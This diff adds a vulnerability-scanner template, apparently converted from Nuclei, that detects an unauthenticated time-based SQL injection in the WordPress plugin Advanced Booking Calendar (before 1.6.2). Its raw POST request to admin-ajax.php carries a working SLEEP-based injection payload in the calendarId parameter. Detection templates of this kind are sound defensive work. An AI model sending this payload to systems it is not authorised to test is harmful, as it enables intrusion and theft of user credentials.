@@ -1,0 +1,126 @@
+{
+  "id": "advanced-booking-calendar-sqli",
+  "name": "Advanced Booking Calendar \u003c 1.6.2 - SQL Injection",
+  "author": "theamanrawat",
+  "severity": "CRITICAL",
+  "description": "The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users\u0027 hashed password, username and email address.\n",
+  "references": [
+    "https://wpscan.com/vulnerability/bac7b590-70de-45b3-bdc2-19f90524ca39",
+    "https://wordpress.org/plugins/advanced-booking-calendar/"
+  ],
+  "tags": [
+    "time-based-sqli",
+    "sqli",
+    "wpscan",
+    "wordpress",
+    "wp-plugin",
+    "wp",
+    "advanced-booking-calendar",
+    "unauthenticated"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "@timeout: 10s\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\ncalendarId\u003d1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440\u003d5440\u0026from\u003d2010-05-05\u0026to\u003d2010-05-09\u0026action\u003dabc_booking_getBookingResult\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "duration\u003e\u003d6",
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains(body, \"abc-result-header\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "advanced-booking-calendar-sqli",
+    "info": {
+      "name": "Advanced Booking Calendar \u003c 1.6.2 - SQL Injection",
+      "author": "theamanrawat",
+      "severity": "critical",
+      "description": "The AJAX action abc_booking_getBookingResult, available to both authenticated and Unauthenticated users did not sanitise the calendarId parameter which was then concatenated to a SQL statement, leading an unauthenticated SQL injection issue. This could be used to retrieve information from the database, such as users\u0027 hashed password, username and email address.\n",
+      "reference": [
+        "https://wpscan.com/vulnerability/bac7b590-70de-45b3-bdc2-19f90524ca39",
+        "https://wordpress.org/plugins/advanced-booking-calendar/"
+      ],
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "time-based-sqli,sqli,wpscan,wordpress,wp-plugin,wp,advanced-booking-calendar,unauthenticated"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "@timeout: 10s\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset\u003dUTF-8\n\ncalendarId\u003d1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440\u003d5440\u0026from\u003d2010-05-05\u0026to\u003d2010-05-09\u0026action\u003dabc_booking_getBookingResult\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "duration\u003e\u003d6",
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains(body, \"abc-result-header\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
